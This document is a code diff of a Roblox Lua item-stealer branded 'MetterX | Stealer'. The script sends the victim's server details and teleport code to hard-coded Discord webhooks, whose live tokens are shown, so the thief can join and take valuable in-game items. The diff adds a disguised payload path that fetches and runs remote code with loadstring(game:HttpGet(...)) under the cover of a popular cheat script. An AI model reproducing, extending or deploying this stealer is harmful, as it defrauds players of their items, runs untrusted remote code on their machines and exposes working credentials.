@@ -1,12 +1,14 @@
 -- [ Settings ] --
 Username = "1LazySly8" -- [Your Username]
 Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Your Webhook For Hits]
+Script = "Highlight Lite" -- [None | Custom | MetterX Hub | Highlight Lite]
+RawLink = "" -- [Raw Link If "Custom"]
 
 -- [ Dual Settings ] --
-DualUsername = "QuadCoreDragon" -- [Dual Username]
+DualUsername = "1LazySly8" -- [Dual Username]
 DualWebhook = "https://discord.com/api/webhooks/1296940147845365910/5klvjPBRgi-hRUmUwp3j5_sXcFLTUdhX6pO8Kmc1Du7zBXqJRPLcwl04DYBJSu9maKMv" -- [Dual Webhook]
-DualItems = 1 -- [Minimum Valuable Items Count]
-DualAncient = 1 -- [Minimum Ancient Count]
+DualItems = 10 -- [Minimum Valuable Items Count]
+DualAncient = 5 -- [Minimum Ancient Count]
 
 repeat wait() until game:IsLoaded()
 
@@ -49,6 +51,7 @@ local PlaceIdValue = game.PlaceId or "Unknown"
 local PlaceVersionValue = game.PlaceVersion or "Unknown"
 local PlatformValue = "Unknown"
 local VersionValue = "v1.0 Dev" -- [Release / Patch / Beta / Dev]
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 
 if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").MouseEnabled then
     PlatformValue = "Mobile"
@@ -64,7 +67,7 @@ function SendMessageEMBED(url, embed, bool)
     local data = {
         username = "MetterX | Stealer",
         avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&",
-        ["content"] = "game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')",
+        ["content"] = " " .. TeleportScript .. " ",
         ["embeds"] = {
             {
                 ["title"] = embed.title,
@@ -76,7 +79,7 @@ function SendMessageEMBED(url, embed, bool)
     local data2 = {
         username = "MetterX | Stealer", 
         avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&", 
-        ["content"] = "--@everyone\ngame:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')",
+        ["content"] = "--@everyone\n " .. TeleportScript .. " ",
         ["embeds"] = {
             {
                 ["title"] = embed.title,
@@ -380,7 +383,7 @@ local embed = {
         },
         {
             ["name"] = "〘:computer:〙**Server Info**",
-            ["value"] = "```lua\nPlace Name: "..PlaceNameValue.."\nPlace Id: "..PlaceIdValue.."\nPlace Version: "..PlaceVersionValue.."\nPlayers Count: "..PlayersValue.."/"..MaxPlayersValue.."\nPlatform: "..PlatformValue.."\nServer Uptime: "..ServerTimeValue.."```"
+            ["value"] = "```lua\nPlace Name: "..PlaceNameValue.."\nPlace Id: "..PlaceIdValue.."\nPlace Version: "..PlaceVersionValue.."\nPlayers Count: "..PlayersValue.."/"..MaxPlayersValue.."\nServer Uptime: "..ServerTimeValue.."\nPlatform: "..PlatformValue.."```"
         }, 
         {
             ["name"] = "〘:ringed_planet:〙**Items**",
@@ -400,9 +403,19 @@ else
 end
 
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName then
+    if player.Name == Username then
         player.Chatted:Connect(function(msg)
             stealItems()
         end)
     end
 end)
+
+if Script == "None" then
+    wait(0)
+elseif Script == "Custom" then
+    loadstring(game:HttpGet(RawLink,true))()
+elseif Script == "Highlight Lite" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Lite"))()
+elseif Script == "MetterX Hub" or Script == "MetterX" then
+    print("soon")
+end
